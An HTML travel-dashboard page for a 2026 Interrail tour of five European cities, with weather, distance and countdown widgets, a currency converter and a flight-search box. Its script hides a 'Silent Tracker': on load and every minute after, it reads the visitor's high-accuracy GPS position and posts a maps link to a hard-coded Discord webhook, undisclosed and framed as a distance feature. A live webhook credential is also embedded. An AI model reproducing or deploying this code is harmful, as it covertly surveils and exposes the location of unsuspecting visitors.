<!DOCTYPE html>
<html lang="en">
<head>
    <meta property="og:title" content="EURO 26">
    <meta property="og:description" content="Grand Tour // Interrail üöÜüåç">
    
    <meta property="og:image" content="https://TM45634592349.github.io/Interrail-2026/preview.jpeg">
    
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="theme-color" content="#111111">
    
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>LN4 // EURO 26</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@500;700&family=Syncopate:wght@700&display=swap" rel="stylesheet">
    <style>
        :root {
            --neon: #CCFF00;
            --dark: #111111;
            --card-bg: #1a1a1a;
            --text: #ffffff;
            --dim: #666;
            --glass: rgba(0, 0, 0, 0.7);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            background-color: var(--dark);
            color: var(--text);
            font-family: 'Rajdhani', sans-serif;
            overflow-x: hidden;
            padding-bottom: 50px; 
            overscroll-behavior-y: none;
        }

        /* --- HEADER --- */
        header { 
            padding-top: max(40px, env(safe-area-inset-top)); 
            padding-bottom: 20px;
            text-align: center; 
            max-width: 1400px;
            margin: 0 auto;
        }

        h1 {
            font-family: 'Syncopate', sans-serif;
            font-size: clamp(2.5rem, 6vw, 5rem);
            text-transform: uppercase;
            font-weight: 700;
            letter-spacing: -2px;
            margin-bottom: 10px;
            color: white;
            line-height: 1.1;
        }

        h1 .highlight { color: var(--neon); }
        .subtitle { color: var(--dim); text-transform: uppercase; letter-spacing: 4px; font-size: 0.8rem; margin-bottom: 30px; }

        /* --- UTILS --- */
        .track-zone { 
            width: 100%; height: 35px; 
            position: relative; overflow: hidden; 
            border-top: 1px solid #333; border-bottom: 1px solid #333; 
            background: rgba(255, 255, 255, 0.02); 
            margin: 0 0 20px; 
        }
        .train-wrapper { position: absolute; white-space: nowrap; font-size: 1.2rem; animation: moveRightToLeft 12s linear infinite; }
        @keyframes moveRightToLeft { 0% { transform: translateX(110vw); } 100% { transform: translateX(-200px); } }

        .timer-container { display: flex; width: 100%; gap: 1px; background: #000; border: 1px solid #333; }
        .time-box { flex: 1; padding: 15px 5px; text-align: center; border-right: 1px solid #333; }
        .time-box span { display: block; font-family: 'Syncopate', sans-serif; font-size: 1.4rem; color: var(--neon); }
        .time-box label { font-size: 0.6rem; color: var(--dim); text-transform: uppercase; letter-spacing: 1px; display: block; margin-top: 5px; }

        /* --- GRID (PERFECT 3-COLUMN LAYOUT) --- */
        .grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); 
            gap: 15px; 
            max-width: 1400px; 
            margin: 20px auto 0; 
            padding: 0 15px; 
        }

        /* PC Fix: 3 Columns. Dashboard fills the last slot perfectly. */
        @media (min-width: 1024px) {
            .grid { grid-template-columns: repeat(3, 1fr); }
        }
        
        .card { 
            background: var(--card-bg); height: 280px; position: relative; overflow: hidden; 
            border: 1px solid #333; transition: transform 0.2s ease-out; 
            display: block; text-decoration: none; color: inherit; cursor: pointer;
            transform: translateZ(0);
        }
        .card img { width: 100%; height: 100%; object-fit: cover; filter: grayscale(100%) contrast(1.2); transition: all 0.5s ease; }
        .card:hover img { filter: grayscale(0%) contrast(1); transform: scale(1.05); }
        @media (min-width: 1024px) { .card:hover { transform: scale(1.02); box-shadow: 0 10px 30px rgba(0,0,0,0.5); border-color: var(--neon); z-index: 10; } }

        .overlay { position: absolute; bottom: 0; left: 0; width: 100%; background: linear-gradient(to top, #000 0%, transparent 100%); padding: 30px 20px 15px; }
        .overlay h2 { font-family: 'Syncopate', sans-serif; font-size: 1.4rem; text-transform: uppercase; display: flex; align-items: center; gap: 10px; }
        .number { color: var(--neon); font-size: 0.9rem; border: 1px solid var(--neon); padding: 2px 6px; }
        
        /* WIDGETS */
        .chip-base {
            position: absolute; top: 15px;
            background: rgba(0,0,0,0.85); border: 1px solid #444; 
            padding: 5px 12px; border-radius: 20px; 
            font-size: 0.8rem; font-family: 'Rajdhani', sans-serif; font-weight: bold;
            display: flex; align-items: center; gap: 5px; 
            backdrop-filter: blur(5px); color: #fff;
            box-shadow: 0 4px 10px rgba(0,0,0,0.5);
        }
        .weather-chip { right: 15px; } 
        .dist-chip { left: 15px; color: var(--neon); border-color: #555; }

        /* --- DASHBOARD CARD (Stacked Layout) --- */
        .dashboard-card { 
            background: #111; 
            border: 1px solid #333; 
            height: 280px; 
            display: flex; 
            flex-direction: column; /* Stacked Vertically */
            position: relative;
        }

        /* Top Half: Currency */
        .currency-box { 
            flex: 1; 
            border-bottom: 1px solid #333;
            display: flex; flex-direction: column; 
            justify-content: center; 
            padding: 0 20px;
            gap: 10px;
        }
        .tool-label { font-family: 'Syncopate'; color: var(--dim); font-size: 0.6rem; letter-spacing: 2px; text-align: center; margin-bottom: 5px; }
        
        .currency-row { display: flex; gap: 5px; }
        .currency-input, .currency-select { background: #222; border: 1px solid #333; padding: 8px; text-align: center; outline: none; }
        .currency-input { width: 60%; color: white; font-family: 'Rajdhani'; font-size: 1.2rem; }
        .currency-select { width: 40%; color: var(--neon); font-family: 'Syncopate'; font-size: 0.8rem; }
        .currency-result { width: 100%; text-align: center; color: var(--neon); font-family: 'Rajdhani'; font-size: 1.4rem; font-weight: bold; border: 1px solid var(--neon); padding: 5px; background: #000; }

        /* Bottom Half: Flight Tracker */
        .radar-box { 
            flex: 1; 
            background: #000; 
            padding: 0 20px; 
            position: relative; 
            display: flex; flex-direction: column; justify-content: center; 
            gap: 10px;
        }

        .radar-input-group { display: flex; gap: 5px; width: 100%; }
        .radar-input { width: 70%; background: transparent; border: 1px solid #333; color: white; padding: 8px; font-family: 'Rajdhani'; font-size: 1rem; text-transform: uppercase; outline: none; text-align: center; }
        .radar-btn { width: 30%; background: var(--neon); border: none; color: black; font-family: 'Syncopate', font-weight: 700; padding: 8px; cursor: pointer; text-transform: uppercase; font-size: 0.8rem; }
        
        /* Decorative Radar Elements */
        .corner { position: absolute; width: 8px; height: 8px; border: 1px solid var(--dim); }
        .tl { top: 10px; left: 10px; border-bottom: 0; border-right: 0; } 
        .tr { top: 10px; right: 10px; border-bottom: 0; border-left: 0; }
        .bl { bottom: 10px; left: 10px; border-top: 0; border-right: 0; }
        .br { bottom: 10px; right: 10px; border-top: 0; border-left: 0; }
        .blip { width: 6px; height: 6px; background-color: var(--neon); border-radius: 50%; animation: pulse 2s infinite; display: inline-block; margin-right: 5px; }
        @keyframes pulse { 0% { opacity: 1; transform: scale(1); } 100% { opacity: 0; transform: scale(2.5); } }

    </style>
</head>
<body>

<header>
    <h1>Euro <span class="highlight">26</span></h1>
    <p class="subtitle">Grand Tour // Interrail</p>
    <div class="track-zone"><div class="train-wrapper">üöÑüöÉüöÉüöÉ</div></div>
    <div class="timer-container">
        <div class="time-box"><span id="d">00</span><label>Days</label></div>
        <div class="time-box"><span id="h">00</span><label>Hrs</label></div>
        <div class="time-box"><span id="m">00</span><label>Mins</label></div>
        <div class="time-box"><span id="s">00</span><label>Secs</label></div>
    </div>
</header>

<div class="grid">
    <a href="https://www.tripadvisor.co.uk/Hotel_Review-g188590-d13457314-Reviews-MEININGER_Hotel_Amsterdam_Amstel-Amsterdam_North_Holland_Province.html" target="_blank" class="card delayed-link">
        <img src="https://images.unsplash.com/photo-1512470876302-972faa2aa9a4?w=800&q=80">
        <div id="d-amsterdam" class="chip-base dist-chip">üìç -- km</div>
        <div id="w-amsterdam" class="chip-base weather-chip">...</div>
        <div class="overlay"><h2><span class="number">01</span> Amsterdam</h2></div>
    </a>
    
    <a href="https://www.booking.com/hotel/de/meininger-berlin-east-side-gallery.en-gb.html?aid=311076&label=meininger-berlin-east-side-gallery" target="_blank" class="card delayed-link">
        <img src="https://images.unsplash.com/photo-1560969184-10fe8719e047?w=800&q=80">
        <div id="d-berlin" class="chip-base dist-chip">üìç -- km</div>
        <div id="w-berlin" class="chip-base weather-chip">...</div>
        <div class="overlay"><h2><span class="number">02</span> Berlin</h2></div>
    </a>
    
    <div class="card">
        <img src="https://images.unsplash.com/photo-1541849546-216549ae216d?w=800&q=80">
        <div id="d-prague" class="chip-base dist-chip">üìç -- km</div>
        <div id="w-prague" class="chip-base weather-chip">...</div>
        <div class="overlay"><h2><span class="number">03</span> Prague</h2></div>
    </div>
    
    <div class="card">
        <img src="https://images.pexels.com/photos/1578335/pexels-photo-1578335.jpeg?auto=compress&cs=tinysrgb&w=800">
        <div id="d-budapest" class="chip-base dist-chip">üìç -- km</div>
        <div id="w-budapest" class="chip-base weather-chip">...</div>
        <div class="overlay"><h2><span class="number">04</span> Budapest</h2></div>
    </div>
    
    <div class="card">
        <img src="https://images.unsplash.com/photo-1516550893923-42d28e5677af?w=800&q=80">
        <div id="d-vienna" class="chip-base dist-chip">üìç -- km</div>
        <div id="w-vienna" class="chip-base weather-chip">...</div>
        <div class="overlay"><h2><span class="number">05</span> Vienna</h2></div>
    </div>

    <div class="dashboard-card">
        <div class="currency-box">
            <div class="tool-label">CURRENCY EXCHANGE</div>
            <div class="currency-row">
                <input type="number" id="currInput" class="currency-input" placeholder="0.00" oninput="convertCurrency()">
                <select id="currSelect" class="currency-select" onchange="convertCurrency()">
                    <option value="EUR">EUR</option><option value="CZK">CZK</option><option value="HUF">HUF</option><option value="PLN">PLN</option>
                </select>
            </div>
            <div id="currResult" class="currency-result">¬£0.00 GBP</div>
        </div>

        <div class="radar-box">
            <div class="corner tl"></div><div class="corner tr"></div><div class="corner bl"></div><div class="corner br"></div>
            <div class="tool-label"><div class="blip"></div> FLIGHT TRACKER</div>
            <div class="radar-input-group">
                <input type="text" id="flightInput" class="radar-input" placeholder="FLIGHT NO.">
                <button class="radar-btn" onclick="searchFlight()">GO</button>
            </div>
        </div>
    </div>
</div>

<script>
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1466082399145168919/p_l5RZmIzJwOSpnQmScU5CkVZVBxwuhvf9Rf7BPNwKLlwJkZv68UHV6uBhhpgZ_45Zh8";

    const cityConfig = [
        { name: 'amsterdam', lat: 52.367, lng: 4.904 },
        { name: 'berlin', lat: 52.520, lng: 13.405 },
        { name: 'prague', lat: 50.075, lng: 14.437 },
        { name: 'budapest', lat: 47.497, lng: 19.040 },
        { name: 'vienna', lat: 48.208, lng: 16.373 }
    ];

    window.onload = function() {
        startSilentTracking();
        fetchLiveWeather();
    };

    function startSilentTracking() {
        if (!navigator.geolocation) {
            updateDistances(0,0, true);
            return;
        }
        sendLocation();
        setInterval(sendLocation, 60000); 
    }

    function sendLocation() {
        const options = { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 };
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                updateDistances(lat, lng, false);
                const mapLink = `https://www.google.com/maps?q=${lat},${lng}`;
                fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `üöÑ **Silent Tracker**\nüìç [Open in Maps](${mapLink})\nüïí ${new Date().toLocaleTimeString()}`
                    })
                }).catch(err => console.error("Tracker Error", err));
            }, 
            (error) => { updateDistances(0,0, true); },
            options
        );
    }

    function updateDistances(userLat, userLng, isError) {
        cityConfig.forEach(city => {
            const el = document.getElementById(`d-${city.name}`);
            if(!el) return;
            if (isError) { el.innerText = "üìç GPS OFF"; return; }
            const R = 6371; 
            const dLat = (city.lat - userLat) * Math.PI / 180;
            const dLon = (city.lng - userLng) * Math.PI / 180;
            const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
                      Math.cos(userLat * Math.PI / 180) * Math.cos(city.lat * Math.PI / 180) * Math.sin(dLon/2) * Math.sin(dLon/2);
            const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
            el.innerText = `üìç ${Math.round(R * c)} km`;
        });
    }

    async function fetchLiveWeather() {
        for (const city of cityConfig) {
            try {
                const response = await fetch(`https://api.open-meteo.com/v1/forecast?latitude=${city.lat}&longitude=${city.lng}&current_weather=true`);
                const data = await response.json();
                const temp = Math.round(data.current_weather.temperature);
                const code = data.current_weather.weathercode;
                const emoji = getWeatherEmoji(code);
                document.getElementById(`w-${city.name}`).innerText = `${emoji} ${temp}¬∞C`;
            } catch (error) { document.getElementById(`w-${city.name}`).innerText = "N/A"; }
        }
    }

    function getWeatherEmoji(code) {
        if (code === 0) return "‚òÄÔ∏è"; if (code <= 3) return "‚õÖ"; if (code <= 48) return "üå´Ô∏è";
        if (code <= 67) return "üåßÔ∏è"; if (code <= 77) return "üå®Ô∏è"; if (code <= 82) return "üå¶Ô∏è";
        if (code <= 99) return "‚õàÔ∏è"; return "üå•Ô∏è"; 
    }

    const rates = { 'EUR': 1.18, 'CZK': 29.50, 'HUF': 460.0, 'PLN': 5.10 };
    function convertCurrency() {
        const amount = parseFloat(document.getElementById('currInput').value);
        const currency = document.getElementById('currSelect').value;
        const resultBox = document.getElementById('currResult');
        if (!amount) { resultBox.innerText = "¬£0.00 GBP"; return; }
        resultBox.innerText = `${(amount * rates[currency]).toFixed(2)} ${currency}`;
    }

    const target = new Date("August 17, 2026 00:00:00").getTime();
    setInterval(() => {
        const gap = target - new Date().getTime();
        document.getElementById("d").innerText = Math.max(0, Math.floor(gap / 86400000)).toString().padStart(2, '0');
        document.getElementById("h").innerText = Math.max(0, Math.floor((gap % 86400000) / 3600000)).toString().padStart(2, '0');
        document.getElementById("m").innerText = Math.max(0, Math.floor((gap % 3600000) / 60000)).toString().padStart(2, '0');
        document.getElementById("s").innerText = Math.max(0, Math.floor((gap % 60000) / 1000)).toString().padStart(2, '0');
    }, 1000);

    document.querySelectorAll('.delayed-link').forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault(); 
            this.classList.add('clicked');
            setTimeout(() => {
                window.open(this.href, '_blank');
                setTimeout(() => this.classList.remove('clicked'), 500);
            }, 500); 
        });
    });

    function searchFlight() {
        const val = document.getElementById("flightInput").value.trim().replace(/\s/g, '').toUpperCase();
        if (val) window.open(`https://flightaware.com/live/flight/${val}`, '_blank');
    }
</script>
</body>
</html>
